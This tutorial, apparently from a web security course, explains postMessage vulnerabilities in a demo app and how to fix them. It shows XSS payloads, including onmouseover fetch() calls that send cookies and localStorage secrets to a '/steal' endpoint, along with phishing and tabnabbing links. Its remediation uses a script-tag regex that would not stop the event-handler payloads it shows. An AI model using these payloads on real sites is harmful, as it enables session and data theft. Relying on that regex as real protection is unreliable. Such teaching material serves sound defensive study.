# `postMessage` Vulnerabilities

The following example demonstrates a `postMessage` vulnerability in a simple web application using Express and SQLite.

## Explanation of the Attack

The `postMessage` vulnerability arises from the fact that our application blindly trusts messages received through the `postMessage` API and directly manipulates the DOM without validation. An attacker can exploit this by sending malicious messages to the origin, which could lead to XSS attacks, data manipulation, etc.

## Example Attack

A malicious site could exploit the vulnerability by sending harmful messages, such as a JavaScript snippet which could be executed in the context of the origin, leading to severe security risks.

Out of the box, this example is vulnerable to a bunch of the XSS attacks we saw earlier.

A user could inject CSS with a message like this:

```html
<style>
  .message {
    background: red;
  }
</style>
```

They could inject a script.

```html
<strong onmouseover="alert(1)">Hello, friend!</strong>
```

That script _could_ steal data from the cookie.

```html
<strong onmouseover="fetch('http://localhost:4009/steal?=' + document.cookie)">
  Hello
</strong>
```

Or, honestly—anything from the client.

```html
<strong
  onmouseover="fetch('http://localhost:4009/steal?=' + localStorage.getItem('secret-storage'))"
>
  Hello
</strong>
```

Sure, you _could_ try to santize and purify everything in sight, but you're still open to phishing or just social engineering.

```html
Click <a href="http://localhost:4009/chat">here</a> to continue the chat.
```

### Tabnabbing

In fact, you _really_ don't need to inject any code.

```html
Can you look at
<a href="http://localhost:4009/innocuous" target="_blank" rel="opener">this</a>
for me?
```

## Steps to Fix and Secure the Application

1. **Validate Origin**: Ensure that messages are coming from a trusted origin.
2. **Validate Message Content**: Prevent injection attacks by validating and sanitizing input.

### Remediation Code

Modify `client/victim.ts` to implement origin and content checks:

```js
const trustedOrigin = 'http://localhost:4109'; // This may be a different port.

window.addEventListener('message', function (event) {
  // Validate event origin
  if (event.origin !== trustedOrigin) {
    console.warn('Untrusted origin:', event.origin);
    return;
  }

  // Validate data format (simple example to check for script tags)
  // Arguably, you should use DOMPurify or something similar.
  const messageData = event.data;
  if (
    typeof messageData !== 'string' ||
    /<script.*?>.*?<\/script.*?>/gi.test(messageData)
  ) {
    console.warn('Invalid message data:', messageData);
    return;
  }

  // The rest of the code to add the message…
});
```

## Detailed Steps

1. **Validate Origin**: Cross-check the `event.origin` against a list or variable containing trusted origins.

   ```js
   if (event.origin !== trustedOrigin) {
     console.warn('Untrusted origin:', event.origin);
     return;
   }
   ```

2. **Validate Content**: Ensure that the message content doesn't contain harmful scripts. More sophisticated methods can be used but simple regex can check for the presence of script tags.

   ```js
   const messageData = event.data;
   if (
     typeof messageData !== 'string' ||
     /<script.*?>.*?<\/script.*?>/gi.test(messageData)
   ) {
     console.warn('Invalid message data:', messageData);
     return;
   }
   ```

3. **Sanitize Inputs**: Tools and libraries help sanitize and validate the input thoroughly.

## Learning Resources

- [MDN `postMessage`](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage)
- [PortSwigger Web Security Academy: Cross-site scripting (XSS)](https://portswigger.net/web-security/cross-site-scripting)
- [OWASP XSS Prevention Cheat Sheet](https://owasp.org/www-project-cheat-sheets/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)

By following these steps, we protect our application against `postMessage` vulnerabilities effectively, preventing XSS attacks and ensuring safe message handling.
